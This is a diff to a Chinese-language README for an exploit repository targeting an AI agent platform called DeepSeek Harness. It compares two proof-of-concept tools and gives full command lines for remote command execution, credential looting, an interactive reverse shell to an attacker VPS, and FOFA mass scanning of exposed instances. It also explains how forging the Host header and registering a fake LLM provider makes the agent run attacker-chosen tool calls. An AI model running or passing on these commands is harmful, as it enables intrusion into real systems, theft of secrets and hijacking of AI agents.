@@ -47,7 +47,58 @@ DeepSeek Harness 的 `/api` 接口通过检查 HTTP `Host` 头来判断请求是
 
 ---
 
+## 本仓库包含两个 PoC 实现
+
+本仓库提供两个不同技术方案的 PoC：
+
+### 1. `dsh_exploit_v2.py` - 简化验证版本（推荐入门）
+
+**技术方案**: 直接调用 `session.prompt` API  
+**优点**:
+- ✅ 代码简单，易于理解攻击原理
+- ✅ 单文件，仅依赖 requests 库
+- ✅ 基于 GitHub Discussion #853 官方验证的 API 格式
+- ✅ 适合快速验证漏洞存在性
+
+**缺点**:
+- ❌ 依赖目标环境配置的真实 LLM
+- ❌ 命令执行是异步的，结果需在目标查看
+- ❌ 功能相对基础
+
+**适合场景**: 漏洞验证、学习攻击原理、简单测试
+
+### 2. `dsh2shell/` - 社区高级版本（功能完整）
+
+**技术方案**: 假 LLM 模型服务器  
+**来源**: https://github.com/ChaoMixian/dsh2shell  
+**优点**:
+- ✅ 确定性命令执行（不依赖真实模型）
+- ✅ 功能完整（交互 Shell、凭证窃取、批量扫描）
+- ✅ 内置假模型服务器，自动化程度高
+- ✅ 支持 FOFA 批量发现暴露实例
+
+**缺点**:
+- ❌ 需要攻击者有公网 VPS（目标需能访问）
+- ❌ 代码较复杂（50KB+）
+
+**适合场景**: 实际渗透测试、批量评估、完整功能需求
+
+### 如何选择？
+
+| 需求 | 推荐工具 |
+|---|---|
+| 快速验证漏洞是否存在 | `dsh_exploit_v2.py` |
+| 学习攻击原理和 API 格式 | `dsh_exploit_v2.py` |
+| 需要稳定的命令执行 | `dsh2shell/` |
+| 需要交互式 Shell | `dsh2shell/` |
+| 批量扫描暴露实例 | `dsh2shell/` |
+| 目标环境没有真实 LLM 配置 | `dsh2shell/` |
+
+---
+
 ## 工具使用
+
+### 使用 dsh_exploit_v2.py（简化版）
 
 ### 依赖安装
 
@@ -111,6 +162,80 @@ python dsh_exploit_v2.py -t http://target:3000 -c "id" -v
   --timeout SECONDS        HTTP 请求超时 (默认: 30)
   -v, --verbose            详细输出模式
 ```
+
+---
+
+### 使用 dsh2shell（高级版）
+
+**⚠️ 重要**: 此工具需要攻击者有公网 VPS，且目标能访问该 VPS。
+
+#### 依赖
+
+- Python 3.8+ (仅标准库)
+- 一个目标可达的公网地址（VPS IP）
+
+#### 基础命令执行
+
+```bash
+cd dsh2shell/
+
+# 执行单条命令
+python3 dsh2shell.py -t http://target:3000 \
+    --public-base http://YOUR_VPS_IP:9999/v1 \
+    --cmd "id"
+
+# 执行多条命令
+python3 dsh2shell.py -t http://target:3000 \
+    --public-base http://YOUR_VPS_IP:9999/v1 \
+    --cmd "id" --cmd "whoami" --cmd "cat /flag"
+```
+
+#### 凭证窃取
+
+```bash
+# 自动搜索环境变量、dotfiles、DSH 配置中的凭证
+python3 dsh2shell.py -t http://target:3000 \
+    --public-base http://YOUR_VPS_IP:9999/v1 \
+    --loot-keys
+```
+
+#### 交互式反弹 Shell
+
+```bash
+# 获取完整的交互式 Shell（使用 Ctrl-] 退出）
+python3 dsh2shell.py -t http://target:3000 \
+    --public-base http://YOUR_VPS_IP:9999/v1 \
+    --shell --lhost YOUR_VPS_IP --raw
+```
+
+#### 只读探测（无害检查）
+
+```bash
+# 探测目标但不执行任何命令
+python3 dsh2shell.py -t http://target:3000 --dry-run
+```
+
+#### FOFA 批量扫描
+
+```bash
+# 需要 FOFA API Key
+export FOFA_KEY='YOUR_FOFA_API_KEY'
+python3 dsh2shell.py --fofa
+```
+
+#### 工作原理
+
+`dsh2shell` 使用更高级的技术：
+
+1. 伪造 Host 头绕过检查
+2. 调用 `llm.registerProvider` 注册假 LLM（指向攻击者 VPS）
+3. 启动内置 HTTP 服务器模拟 OpenAI API
+4. 返回预定的 tool calls JSON（确定性执行）
+5. DSH Agent 执行攻击者控制的命令
+
+**优势**: 不依赖目标的真实 LLM 配置，命令执行是确定性的。
+
+详细文档请查看 `dsh2shell/README.md` 和 `dsh2shell/ABOUT.md`。
 
 ---
 
